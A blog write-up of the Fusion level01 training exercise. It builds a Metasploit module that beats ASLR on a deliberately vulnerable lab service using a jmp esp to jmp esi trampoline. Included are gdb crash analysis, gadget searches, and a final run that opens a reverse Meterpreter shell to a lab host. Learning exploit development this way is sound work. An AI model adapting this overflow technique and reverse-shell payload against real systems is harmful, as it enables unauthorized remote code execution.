---
layout: post
title: Fusion level01 write up
excerpt: "Was fusion level00 a breeze? This walkthrough explores developing the same exploit with ASLR enabled. Understanding ASLR is required for attempting the next challenges."
categories: Exploit-dev
tags:
  - exploit-dev
permalink: "fusion/level01"
---

This post details a walkthrough on how to create a Metasploit module for level01 of the Fusion exploit exercise at [https://exploit-exercises.com](https://exploit-exercises.com). This level uses the same code with the same bug as level00. For intial setup and bug analysis see the [previous walkthrough]({{site.baseurl}}/fusion-level00-walkthrough). This level adds in system ASLR for the stack, heap, etc.

## Inspecting the crash
---
The exploit steps in level00 were:

* Control the value of eip
* Find the payload in memory
* Point eip at the payload

The third step above is no longer reliable because the payload is stored on the stack and each time the program executes the location of the stack changes. The difficultly is finding a way to reliably locate the payload. Below is a module similar to the proof of concept developed for level00 that will cause the pogram to crash. The time of the crash is the ideal time to inspect memory because this state will be consistent each time, though exact addresses will change.

_Note: If the module below is confusing please browse the level00 walkthrough_

{% highlight bash %}
class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Fusion level00 remote stack buffer overflow',
      'Description'    => %q{
                           This module exploits a stack buffer overflow in level00 of the
                           fusion exploit exercises.
                           },
      'Author'         => [ 'Philip OKeefe' ],
      'Version'        => '1',
      'DefaultOptions' =>
              {
                      'EXITFUNC' => 'process',
              },
      'Payload'        =>
              {
                      'Space'    => 788,
                      'BadChars' => "\x00",
                      'StackAdjustment' => -4000,
              },
      'Platform'       => 'linux',

      'Targets'        =>
              [
                      ['Linux', {} ],
              ],
      'DefaultTarget' => 0,

      'Privileged'     => false
      ))

      register_options(
      [
              Opt::RHOST("192.168.79.132"),
              Opt::RPORT(20001),
      ], self.class)
   end

   def exploit
    # Open the TCP connection
    connect

    # Create the payload
    filename = Rex::Text.pattern_create(500)
    sploit = "GET #{filename} HTTP/1.1\r\n" + Rex::Text.pattern_create(200)

    # Send the payload
    sock.put(sploit)

    handler
    disconnect
   end
end
{% endhighlight %}

The above module will send two Metasploit patterns. The `pattern_find` command will detail where these patterns are in memory, register that hold part of the pattern, and registers that points to part of a pattern. This output will display what registers are under attacker control.

_Note: The_ `pattern_find` _and_ `pattern_offset` _are custom commands which can be found [here](http://github.com/philwantsfish/gdb_commands)_

{% highlight bash %}
(gdb) c
Continuing.
[New process 23279]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 23279]
0x65413665 in ?? ()
(gdb) pattern_offset eip
139
(gdb) pattern_find
| Location   | Length | Region
| 0xbff96b31 | 500    | [stack]
| 0xbff96dd9 | 200    | [stack]
| Pointer    | 143    | esp   
| Register   | 135    | ebp   
| Pointer    | 0      | esi   
| Register   | 139    | eip   
(gdb) i r
eax            0x1  1
ecx            0xb76788d0 -1217951536
edx            0xbff96d25 -1074172635
ebx            0xb77f0ff4 -1216409612
esp            0xbff96bc0 0xbff96bc0
ebp            0x41356541 0x41356541
esi            0xbff96dd9 -1074172455
edi            0x8049ed1  134520529
eip            0x65413665 0x65413665
eflags         0x10246  [ PF ZF IF RF ]
cs             0x73 115
ss             0x7b 123
ds             0x7b 123
es             0x7b 123
fs             0x0  0
gs             0x33 51
(gdb)
{% endhighlight %}

The attacker can control the value of `eip` from the bytes at offset 139 into the path buffer. The `esp` register points to offset 143 in the path buffer and the `esi` register points to offset 0 the second pattern. In level00 the second pattern is where is the payload was sent, assuming the payload will be transmitted in the same way, `esi` points to the start of the payload.

## Which way to jump
---

Using the `jmp reg` technique an attacker can execute instructions at an address specified by a register. Since the attacker controls the data that `esp` and `esi` points at, they can execute arbitrary instructions using either a `jmp esp` or `jmp esi` instruction.

First try the `esi` register because it points directly at the payload. The level01 binary is not compiled as position indepedent code causing all the instructions to have static addresses. The attacker can rely on these memory addresses for instructions, such as the `jmp esi`. ROPGadget by Jonathan Salwan is a tool to find desirable sets of instructions, or gadgets.

Use ROPGadget to find all `jmp` instructions:

{% highlight bash %}
pwf@ubuntu:~$ ROPgadget --binary level01 --only "jmp"
Gadgets information
============================================================
0x08049f4f : jmp esp

Unique gadgets found: 1
{% endhighlight %}

No `jmp` instructions for `esi`. Instead try finding a `call` instruction instead:

{% highlight bash %}
Unique gadgets found: 1
pwf@ubuntu:~$ ROPgadget --binary level01 --only "call"
Gadgets information
============================================================
0x080499d4 : call 0x8049a48
0x0804a023 : call dword ptr [ebx]
0x08048c1f : call eax
0x08049f0f : call esp

Unique gadgets found: 4
{% endhighlight %}

No call instructions either... In hopes of moving the value of `esi` to another register find all gadgets that involve `esi`:

{% highlight bash %}
pwf@ubuntu:~$ ROPgadget --binary level01 | grep esi
0x08049608 : adc byte ptr [esi + 0x5f], bl ; pop ebp ; ret
0x08049973 : add al, 0 ; add byte ptr [esi + 0x5f], bl ; pop ebp ; ret
0x08049604 : add byte ptr [eax], al ; add esp, 0x10 ; pop esi ; pop edi ; pop ebp ; ret
0x08049974 : add byte ptr [eax], al ; pop esi ; pop edi ; pop ebp ; ret
0x08049975 : add byte ptr [esi + 0x5f], bl ; pop ebp ; ret
0x08049606 : add esp, 0x10 ; pop esi ; pop edi ; pop ebp ; ret
0x08049a29 : add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049970 : add esp, 0x420 ; pop esi ; pop edi ; pop ebp ; ret
0x08049972 : and byte ptr [eax + eax], al ; add byte ptr [esi + 0x5f], bl ; pop ebp ; ret
0x08049a27 : jne 0x8049a11 ; add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049a2a : les ebx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x08049607 : les edx, ptr [eax] ; pop esi ; pop edi ; pop ebp ; ret
0x08049060 : les esi, ptr [eax] ; add al, byte ptr [eax] ; add byte ptr [ebx + 0x5f], bl ; pop ebp ; ret
0x08049a62 : les esi, ptr [edx - 0x6f99f7fc] ; sub ebx, 4 ; call eax
0x08049971 : les esp, ptr [eax] ; add al, 0 ; add byte ptr [esi + 0x5f], bl ; pop ebp ; ret
0x08049a63 : mov dl, 4 ; or byte ptr [esi - 0x70], ah ; sub ebx, 4 ; call eax
0x08049a65 : or byte ptr [esi - 0x70], ah ; sub ebx, 4 ; call eax
0x08049a2c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049609 : pop esi ; pop edi ; pop ebp ; ret
0x080499d1 : push edi ; push esi ; push ebx ; call 0x8049a4b
0x080499d2 : push esi ; push ebx ; call 0x8049a4a
0x08049a2b : sbb al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
{% endhighlight %}

None of these gadgets seem to allow moving the value to another register... Fortunately there is a `jmp esp` gadget at address `0x08049f4f`. The `esp` register will direct execution to the data in the path buffer that is not large enough for the payload, but we can put a `jmp esi` instruction there.

Game plan:

* Load `eip` with the address for a `jmp esp` instruction
* The `jmp esp` will cause data in the path buffer to execute
* The path buffer will contain a `jmp esi` instruction
* The `jmp esi` will execute the payload

## Jump jump away
---

Load address `0x08049f4f` in `eip`,

{% highlight Ruby %}
...
junk = "A" * 139
ret = [0x08049f4f].pack('V')
trailing_junk = "B" * ( 200 - junk.length - ret.length )
filename = junk + ret + trailing_junk
...
{% endhighlight %}

Attach gdb, set a breakpoint on the `0x08049f4f` address, and send the exploit

{% highlight bash %}
(gdb) x/1i 0x08049f4f
0x8049f4f: jmp    esp
(gdb) b *0x08049f4f
Breakpoint 1 at 0x8049f4f
(gdb) c
Continuing.
[New process 31596]
[Switching to process 31596]

Breakpoint 1, 0x08049f4f in ?? ()
(gdb) x/1i $eip
=> 0x8049f4f:  jmp    esp
(gdb) x/4x $esp-4
0xbff96bbc:  0x08049f4f  0x42424242  0x42424242  0x42424242
(gdb)
{% endhighlight %}

Confirmed we are hitting the `jmp esp` gadget and that `esp` points to the string of 'B's.

Replace the 'B's with a `jmp esi`. Metasploit comes with a library to convert instructions to opcodes named Metasm. Replace the payload with breakpoints to confirm execution.

{% highlight Ruby %}
def exploit
  connect

  # Overwrite eip with the address of our payload
  junk = "A" * 139
  ret = [0x08049f4f].pack('V')
  jmp_esi = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp esi").encode_string
  trailing_junk = "B" * ( 200 - junk.length - ret.length - jmp_esi.length )
  filename = junk + ret + jmp_esi + trailing_junk

  # For now make the payload breakpoints
  sploit = "GET #{filename} HTTP/1.1" + "\xcc" * 200

  # Send the payload
  sock.put(sploit)

  handler
  disconnect
end
{% endhighlight %}

Attach gdb, reload the module, and send the exploit:

{% highlight bash %}
(gdb) c
Continuing.
[New process 31802]

Program received signal SIGTRAP, Trace/breakpoint trap.
[Switching to process 31802]
0xbff96cae in ?? ()
(gdb) x/4x $eip
0xbff96cae: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
(gdb)
{% endhighlight %}

Confirmed we have hit the payload! Replace the breakpoints with a Metasploit payload

{% highlight Ruby %}
...
sploit = "GET #{filename} HTTP/1.1" + payload.encoded
...
{% endhighlight %}

Send the exploit!

{% highlight bash %}
msf exploit(level00-p1) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf exploit(level00-p1) > set LHOST 192.168.79.133
LHOST => 192.168.79.133
msf exploit(level00-p1) > exploit

[*] Started reverse handler on 192.168.79.133:4444
[*] Transmitting intermediate stager for over-sized stage...(100 bytes)
[*] Sending stage (1241088 bytes) to 192.168.79.132
[*] Meterpreter session 2 opened (192.168.79.133:4444 -> 192.168.79.132:43961) at 2015-04-17 13:32:21 -0700

meterpreter >
{% endhighlight %}

Success! Meterpreter shell and the puzzle is solved.

{% highlight bash %}
{% endhighlight %}
